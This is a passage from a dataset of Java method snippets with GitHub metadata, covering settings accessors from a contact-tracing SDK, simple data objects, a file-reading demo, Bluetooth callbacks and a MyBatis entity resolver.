"https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55336, "method_name": "setReceivingEnabled", "class_name": "AppConfigManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setReceivingEnabled(boolean enabled) {\n\t\tsharedPrefs.edit().putBoolean(PREF_RECEIVING_ENABLED, enabled).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55337, "method_name": "isReceivingEnabled", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isReceivingEnabled() {\n\t\treturn sharedPrefs.getBoolean(PREF_RECEIVING_ENABLED, false);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55338, "method_name": "setLastLoadedBatchReleaseTime", "class_name": "AppConfigManager", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastLoadedBatchReleaseTime(long lastLoadedBatchReleaseTime) {\n\t\tsharedPrefs.edit().putLong(PREF_LAST_LOADED_BATCH_RELEASE_TIME, lastLoadedBatchReleaseTime).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55339, "method_name": "getLastLoadedBatchReleaseTime", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getLastLoadedBatchReleaseTime() {\n\t\treturn sharedPrefs.getLong(PREF_LAST_LOADED_BATCH_RELEASE_TIME, -1);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55340, "method_name": "setLastSyncDate", "class_name": "AppConfigManager", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastSyncDate(long lastSyncDate) {\n\t\tsharedPrefs.edit().putLong(PREF_LAST_SYNC_DATE, lastSyncDate).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55341, "method_name": "getLastSyncDate", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getLastSyncDate() {\n\t\treturn sharedPrefs.getLong(PREF_LAST_SYNC_DATE, 0);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55342, "method_name": "setLastSyncNetworkSuccess", "class_name": "AppConfigManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastSyncNetworkSuccess(boolean success) {\n\t\tsharedPrefs.edit().putBoolean(PREF_LAST_SYNC_NET_SUCCESS, success).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55343, "method_name": "getLastSyncNetworkSuccess", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean getLastSyncNetworkSuccess() {\n\t\treturn sharedPrefs.getBoolean(PREF_LAST_SYNC_NET_SUCCESS, true);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55344, "method_name": "getIAmInfected", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean getIAmInfected() {\n\t\treturn sharedPrefs.getBoolean(PREF_I_AM_INFECTED, false);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55345, "method_name": "setIAmInfected", "class_name": "AppConfigManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setIAmInfected(boolean exposed) {\n\t\tsharedPrefs.edit().putBoolean(PREF_I_AM_INFECTED, exposed).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55346, "method_name": "getBackendReportRepository", "class_name": "AppConfigManager", "params": ["Context"], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "BackendReportRepository", "snippet": "\tpublic BackendReportRepository getBackendReportRepository(Context context) throws IllegalStateException {\n\t\tApplicationInfo appConfig = getAppConfig();\n\t\treturn new BackendReportRepository(context, appConfig.getReportBaseUrl());\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55347, "method_name": "setDevDiscoveryModeEnabled", "class_name": "AppConfigManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDevDiscoveryModeEnabled(boolean enable) {\n\t\tisDevDiscoveryMode = enable;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55348, "method_name": "setCalibrationTestDeviceName", "class_name": "AppConfigManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCalibrationTestDeviceName(String name) {\n\t\tif (name != null && name.length() != CALIBRATION_TEST_DEVICE_NAME_LENGTH) {\n\t\t\tthrow new IllegalArgumentException(\n\t\t\t\t\t\"CalibrationTestDevice Name must have length \" + CALIBRATION_TEST_DEVICE_NAME_LENGTH + \", provided string '\" +\n\t\t\t\t\t\t\tname + \"' with length \" + name.length());\n\t\t}\n\t\tsharedPrefs.edit().putString(PREF_CALIBRATION_TEST_DEVICE_NAME, name).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55349, "method_name": "getCalibrationTestDeviceName", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getCalibrationTestDeviceName() {\n\t\treturn sharedPrefs.getString(PREF_CALIBRATION_TEST_DEVICE_NAME, null);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55350, "method_name": "setScanDuration", "class_name": "AppConfigManager", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setScanDuration(long scanDuration) {\n\t\tsharedPrefs.edit().putLong(PREF_SCAN_DURATION, scanDuration).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55351, "method_name": "getScanDuration", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getScanDuration() {\n\t\treturn sharedPrefs.getLong(PREF_SCAN_DURATION, DEFAULT_SCAN_DURATION);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55352, "method_name": "setScanInterval", "class_name": "AppConfigManager", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setScanInterval(long scanInterval) {\n\t\tsharedPrefs.edit().putLong(PREF_SCAN_INTERVAL, scanInterval).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55353, "method_name": "getScanInterval", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getScanInterval() {\n\t\treturn sharedPrefs.getLong(PREF_SCAN_INTERVAL, DEFAULT_SCAN_INTERVAL);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55354, "method_name": "setBluetoothPowerLevel", "class_name": "AppConfigManager", "params": ["BluetoothTxPowerLevel"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBluetoothPowerLevel(BluetoothTxPowerLevel powerLevel) {\n\t\tsharedPrefs.edit().putInt(PREF_ADVERTISEMENT_POWER_LEVEL, powerLevel.ordinal()).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55355, "method_name": "getBluetoothTxPowerLevel", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BluetoothTxPowerLevel", "snippet": "\tpublic BluetoothTxPowerLevel getBluetoothTxPowerLevel() {\n\t\treturn BluetoothTxPowerLevel.values()[sharedPrefs\n\t\t\t\t.getInt(PREF_ADVERTISEMENT_POWER_LEVEL, DEFAULT_BLUETOOTH_POWER_LEVEL.ordinal())];\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55356, "method_name": "getBluetoothScanMode", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BluetoothScanMode", "snippet": "\tpublic BluetoothScanMode getBluetoothScanMode() {\n\t\treturn BluetoothScanMode.values()[sharedPrefs.getInt(PREF_BLUETOOTH_SCAN_MODE, DEFAULT_BLUETOOTH_SCAN_MODE.ordinal())];\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55357, "method_name": "setBluetoothScanMode", "class_name": "AppConfigManager", "params": ["BluetoothScanMode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBluetoothScanMode(BluetoothScanMode scanMode) {\n\t\tsharedPrefs.edit().putInt(PREF_BLUETOOTH_SCAN_MODE, scanMode.ordinal()).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55358, "method_name": "setBluetoothAdvertiseMode", "class_name": "AppConfigManager", "params": ["BluetoothAdvertiseMode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBluetoothAdvertiseMode(BluetoothAdvertiseMode advertiseMode) {\n\t\tsharedPrefs.edit().putInt(PREF_ADVERTISEMENT_MODE, advertiseMode.ordinal()).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55359, "method_name": "getBluetoothAdvertiseMode", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BluetoothAdvertiseMode", "snippet": "\tpublic BluetoothAdvertiseMode getBluetoothAdvertiseMode() {\n\t\treturn BluetoothAdvertiseMode.values()[sharedPrefs\n\t\t\t\t.getInt(PREF_ADVERTISEMENT_MODE, DEFAULT_BLUETOOTH_ADVERTISE_MODE.ordinal())];\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55360, "method_name": "isScanResponseEnabled", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isScanResponseEnabled() {\n\t\treturn sharedPrefs.getBoolean(PREF_BLUETOOTH_USE_SCAN_RESPONSE, DEFAULT_BLUETOOTH_USE_SCAN_RESPONSE_ENABLED);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55361, "method_name": "setUseScanResponse", "class_name": "AppConfigManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUseScanResponse(boolean useScanResponse) {\n\t\tsharedPrefs.edit().putBoolean(PREF_BLUETOOTH_USE_SCAN_RESPONSE, useScanResponse).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55362, "method_name": "getContactAttenuationThreshold", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "\tpublic float getContactAttenuationThreshold() {\n\t\treturn sharedPrefs.getFloat(PREF_CONTACT_ATTENUATION_THRESHOLD, DEFAULT_CONTACT_ATTENUATION_THRESHOLD);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55363, "method_name": "setContactAttenuationThreshold", "class_name": "AppConfigManager", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setContactAttenuationThreshold(float threshold) {\n\t\tsharedPrefs.edit().putFloat(PREF_CONTACT_ATTENUATION_THRESHOLD, threshold).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55364, "method_name": "getNumberOfWindowsForExposure", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getNumberOfWindowsForExposure() {\n\t\treturn sharedPrefs.getInt(PREF_NUMBER_OF_WINDOWS_FOR_EXPOSURE, DEFAULT_NUMBER_OF_WINDOWS_FOR_EXPOSURE);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55365, "method_name": "setNumberOfWindowsForExposure", "class_name": "AppConfigManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setNumberOfWindowsForExposure(int threshold) {\n\t\tsharedPrefs.edit().putInt(PREF_NUMBER_OF_WINDOWS_FOR_EXPOSURE, threshold).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55366, "method_name": "clearPreferences", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clearPreferences() {\n\t\tsharedPrefs.edit().clear().apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55367, "method_name": "getId", "class_name": "ItemDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55368, "method_name": "setId", "class_name": "ItemDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55369, "method_name": "getTitle", "class_name": "ItemDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55370, "method_name": "setTitle", "class_name": "ItemDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55371, "method_name": "getPrice", "class_name": "ItemDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal getPrice() {\n        return price;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55372, "method_name": "setPrice", "class_name": "ItemDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPrice(BigDecimal price) {\n        this.price = price;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55373, "method_name": "getDescription", "class_name": "ItemDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {\n        return description;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55374, "method_name": "setDescription", "class_name": "ItemDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {\n        this.description = description;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55375, "method_name": "getSales", "class_name": "ItemDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getSales() {\n        return sales;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55376, "method_name": "setSales", "class_name": "ItemDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSales(Integer sales) {\n        this.sales = sales;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55377, "method_name": "getImgUrl", "class_name": "ItemDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getImgUrl() {\n        return imgUrl;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55378, "method_name": "setImgUrl", "class_name": "ItemDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setImgUrl(String imgUrl) {\n        this.imgUrl = imgUrl;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55379, "method_name": "main", "class_name": "InputStreamReaderDemo", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        read_utf_8();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/Stream/InputStreamReaderDemo.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55380, "method_name": "read_utf_8", "class_name": "InputStreamReaderDemo", "params": [], "throws": ["IOException"], "modifiers": ["static", "private"], "return_type": "void", "snippet": "    private static void read_utf_8() throws IOException {\n        //1\u3001\u521b\u5efa InputStreamReader \u5bf9\u8c61\uff0c\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012\u5b57\u8282\u8f93\u5165\u6d41\u548c\u6307\u5b9a\u7684\u7f16\u7801\u8868\u540d\u79f0\n        InputStreamReader isr = new InputStreamReader(new FileInputStream(\"/Users/chengcheng/Desktop/test/abc/abc.txt\"),\"utf-8\");\n        //2\u3001\u4f7f\u7528 InputStreamReader \u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5 read \u8bfb\u53d6\u6587\u4ef6\n        int len = 0;\n        while((len = isr.read()) != -1){\n            System.out.println(len);\n        }\n        //3\u3001\u91ca\u653e\u8d44\u6e90\n        isr.close();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/Stream/InputStreamReaderDemo.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55381, "method_name": "main", "class_name": "TestBubbleSort", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tBubbleSort bs = new BubbleSort();\n\t\t\n\t\tint[] arr = {1,1,21,1};\n\t\t\n\t\tbs.sort(arr);\n\t\t\n\t\tfor(int i =0 ;i < arr.length; i++) {\n\t\t\tSystem.out.print(arr[i]+\" \");\n\t\t}\n\n\t}", "url": "https://raw.githubusercontent.com/likith22/DataStructures/master/TestBubbleSort.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55382, "method_name": "onBluetoothAdapterStateChanged", "class_name": "MethodInfoGenerator", "params": ["int"], "throws": null, "modifiers": ["static"], "return_type": "MethodInfo", "snippet": "    static MethodInfo onBluetoothAdapterStateChanged(int state) {\n        return new MethodInfo(\"onBluetoothAdapterStateChanged\", new MethodInfo.Parameter(int.class, state));\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/MethodInfoGenerator.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55383, "method_name": "onConnectionStateChanged", "class_name": "MethodInfoGenerator", "params": ["BluetoothDevice", "int"], "throws": null, "modifiers": ["static"], "return_type": "MethodInfo", "snippet": "    static MethodInfo onConnectionStateChanged(BluetoothDevice device, int state) {\n        return new MethodInfo(\"onConnectionStateChanged\", new MethodInfo.Parameter(BluetoothDevice.class, device),\n                new MethodInfo.Parameter(int.class, state));\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/MethodInfoGenerator.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55384, "method_name": "onRead", "class_name": "MethodInfoGenerator", "params": ["BluetoothDevice", "byte"], "throws": null, "modifiers": ["static"], "return_type": "MethodInfo", "snippet": "    static MethodInfo onRead(BluetoothDevice device, byte[] value) {\n        return new MethodInfo(\"onRead\", new MethodInfo.Parameter(BluetoothDevice.class, device),\n                new MethodInfo.Parameter(byte[].class, value));\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/MethodInfoGenerator.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55385, "method_name": "onWrite", "class_name": "MethodInfoGenerator", "params": ["BluetoothDevice", "String", "byte", "boolean"], "throws": null, "modifiers": ["static"], "return_type": "MethodInfo", "snippet": "    static MethodInfo onWrite(BluetoothDevice device, @NonNull String tag, @NonNull byte[] value, boolean result) {\n        return new MethodInfo(\"onWrite\", new MethodInfo.Parameter(BluetoothDevice.class, device),\n                new MethodInfo.Parameter(String.class, tag), new MethodInfo.Parameter(byte[].class, value),\n                new MethodInfo.Parameter(boolean.class, result));\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/MethodInfoGenerator.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55386, "method_name": "resolveEntity", "class_name": "XMLMapperEntityResolver", "params": ["String", "String"], "throws": ["SAXException"], "modifiers": ["public"], "return_type": "InputSource", "snippet": "  public InputSource resolveEntity(String publicId, String systemId) throws SAXException {\n    try {\n      if (systemId != null) {\n        String lowerCaseSystemId = systemId.toLowerCase(Locale.ENGLISH);\n        if (lowerCaseSystemId.contains(MYBATIS_CONFIG_SYSTEM) || lowerCaseSystemId.contains(IBATIS_CONFIG_SYSTEM)) {\n          return getInputSource(MYBATIS_CONFIG_DTD, publicId, systemId);\n        } else if (lowerCaseSystemId.contains(MYBATIS_MAPPER_SYSTEM) || lowerCaseSystemId.contains(IBATIS_MAPPER_SYSTEM)) {\n          return getInputSource(MYBATIS_MAPPER_DTD, publicId, systemId);\n        }\n      }\n      return null;\n    } catch (Exception e) {\n      throw new SAXException(e.toString());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperEntityResolver.java", "stars": "15", "class_props": {"extends": null, "implements": ["EntityResolver"], "modifiers": ["public"]}}, {"id": 55387, "method_name": "getInputSource", "class_name": "XMLMapperEntityResolver", "params": ["String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "InputSource", "snippet": "  private InputSource getInputSource(String path, String publicId, String systemId) {\n    InputSource source = null;\n    if (path != null) {\n      try {\n        InputStream in = Resources.getResourceAsStream(path);\n        source = new InputSource(in);\n        source.setPublicId(publicId);\n        source.setSystemId(systemId);\n      } catch (IOException e) {\n        // ignore, null is ok\n      }\n    }\n    return source;\n  }", "url": 